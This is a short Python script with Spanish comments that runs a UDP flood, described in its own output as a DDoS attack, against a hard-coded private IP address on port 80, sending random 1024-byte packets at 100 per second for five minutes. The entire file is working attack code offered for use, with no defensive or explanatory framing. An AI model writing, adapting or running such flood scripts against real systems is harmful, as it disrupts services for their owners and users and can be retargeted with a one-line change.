import socket
import random
import time

# Configuración de la dirección IP y puerto del objetivo
target_ip = "192.168.195.131"  
target_port = 80  

duration = 300  # Duración del ataque en segundos
requests_per_second = 100  # Número de solicitudes por segundo

# Crear un socket UDP
udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def generate_packet():
    return random._urandom(1024)  # Generar un paquete de datos aleatorio de 1024 bytes

# Ejecutar el ataque durante el tiempo especificado
print("Iniciando ataque DDoS...")
start_time = time.time()
while time.time() - start_time < duration:
    for i in range(requests_per_second):
        udp_socket.sendto(generate_packet(), (target_ip, target_port))
        print(f"Solicitud enviada ({i+1}/{requests_per_second})")
    time.sleep(1)

udp_socket.close()
print("Ataque DDoS completado.")
